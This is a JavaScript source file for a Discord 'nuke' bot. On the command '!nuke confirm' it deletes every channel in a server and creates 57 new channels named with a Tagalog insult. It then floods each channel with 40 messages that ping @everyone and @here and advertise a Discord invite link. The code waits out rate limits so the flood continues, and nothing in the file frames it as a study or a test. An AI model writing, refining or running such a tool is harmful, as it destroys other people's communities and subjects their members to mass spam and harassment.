const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityType } = require('discord.js');

// ONLY need TOKEN from Railway env
const TOKEN = process.env.TOKEN;

if (!TOKEN) {
  console.error("❌ NO TOKEN. Set TOKEN in Railway environment variables.");
  process.exit(1);
}

console.log(`🔑 Token loaded, length: ${TOKEN.length}`);

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

const prefix = '!';
const spamMsg = `@everyone @here Lipad server mga kumag! https://discord.gg/qWD57gU7S __script__ . ~~boost~~ ||@everyone|| ||@here||`;

function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function deleteAllChannels(guild) {
  let channels = guild.channels.cache;
  console.log(`🗑️ Deleting ${channels.size} channels...`);
  for (let chan of channels.values()) {
    try { await chan.delete(); await sleep(400); } catch(e) { console.log(`Failed: ${chan.name} – ${e.message}`); }
  }
}

async function create57Channels(guild) {
  let created = [];
  for (let i = 1; i <= 57; i++) {
    let name = `lipad-server-mga-kumag-${i}`;
    try {
      let channel = await guild.channels.create({
        name: name,
        type: ChannelType.GuildText,
        permissionOverwrites: [{ id: guild.roles.everyone.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }]
      });
      created.push(channel);
      console.log(`📝 Created #${name}`);
      await sleep(350);
    } catch(err) {
      if (err.code === 429) { await sleep(err.retryAfter * 1000); i--; }
      else console.log(`❌ Create fail ${name}: ${err.message}`);
    }
  }
  return created;
}

async function floodChannel(channel, count = 40) {
  for (let i = 0; i < count; i++) {
    try { await channel.send(spamMsg); await sleep(200); }
    catch(err) {
      if (err.code === 429) { await sleep(err.retryAfter * 1000); i--; }
      else console.log(`❌ Msg fail in #${channel.name}: ${err.message}`);
    }
  }
  console.log(`📢 Sent 40 messages in #${channel.name}`);
}

async function nukeGuild(guild) {
  console.log(`🔥 NUKING ${guild.name}`);
  await deleteAllChannels(guild);
  let channels = await create57Channels(guild);
  for (let ch of channels) await floodChannel(ch, 40);
  console.log("💀 NUKE COMPLETE");
}

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  // DND status with custom text @azairo
  client.user.setPresence({
    status: 'dnd',
    activities: [{ name: '@azairo', type: ActivityType.Custom, state: '@azairo' }]
  });
  console.log("✅ Status: DND | @azairo");
});

client.on('messageCreate', async (msg) => {
  if (msg.author.bot || !msg.content.startsWith(prefix)) return;
  const args = msg.content.slice(prefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  
  if (cmd === 'nuke') {
    if (args[0] !== 'confirm') {
      return msg.reply("⚠️ Type `!nuke confirm` to delete ALL channels and create 57 new ones with 40 pings each.");
    }
    await msg.reply("💣 NUKE ACTIVATED. Everything will be destroyed.");
    await nukeGuild(msg.guild);
  }
});

client.login(TOKEN).catch(err => {
  console.error("❌ Login failed:", err.message);
  if (err.message.includes("token")) console.error("➡️ Invalid token. Reset it on Discord Developer Portal.");
});
